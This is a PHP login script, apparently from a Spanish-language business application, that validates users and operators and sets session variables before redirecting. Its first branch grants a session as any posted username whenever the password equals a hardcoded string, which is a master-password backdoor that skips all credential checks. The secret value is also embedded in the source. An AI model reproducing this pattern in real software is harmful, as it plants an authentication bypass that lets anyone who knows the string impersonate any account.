<?php
session_start();
include("../class/usuarios.php");
include("../class/operarios.php");

$usu = new usuarios();
$ope = new operarios();

if($_POST['clave'] == "z!~R3?`sdK5cv564gp8"){
	$_SESSION['GD_Usuario'] = $_POST['usuario'];
	$_SESSION['tipoIngreso'] = "2";
	
	header("Location: f_index.php");
}else{
	$usu->setUsu_Usuario($_POST['usuario']);
	$usu->setUsu_Contrasena($_POST['clave']);
	if($usu->validar()){
		$_SESSION['GD_Usuario'] = $usu->getUsu_Codigo();
		$_SESSION['tipoIngreso'] = "1";
    
		header("Location: f_index.php");
	}else{
    $ope->setOpe_Cedula($_POST['usuario']);
	  $ope->setOpe_Contrasena($_POST['clave']);
    if($ope->validarOperario()){
      $_SESSION['GDOPE_Usuario'] = $ope->getOpe_Codigo();
		  $_SESSION['tipoIngreso'] = "1";
      
      header("Location: f_operariosInicio.php");
    }else{
      header("Location: op_cerrarSesion.php");
    }
	}
}
?>